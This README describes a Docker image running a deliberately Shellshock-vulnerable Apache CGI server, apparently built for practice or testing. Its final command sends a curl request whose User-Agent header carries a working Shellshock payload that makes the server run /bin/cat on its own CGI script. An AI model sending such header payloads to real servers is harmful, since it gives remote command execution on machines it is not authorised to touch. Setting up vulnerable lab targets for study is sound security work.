docker-shellshockable
=====================

Docker container with Apache 2 / CGI shellshock vulnerable.


``` sh
#> docker run -d --name shellshock zenithar/shellshockable
#> docker ps
#> export WEBSRV=`docker inspect --format "{{.NetworkSettings.IPAddress}}" shellshock`
#> curl http://$WEBSRV/cgi-bin/shockme.cgi
#> curl -A "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /usr/lib/cgi-bin/shockme.cgi" http://$WEBSRV/cgi-bin/shockme.cgi
```
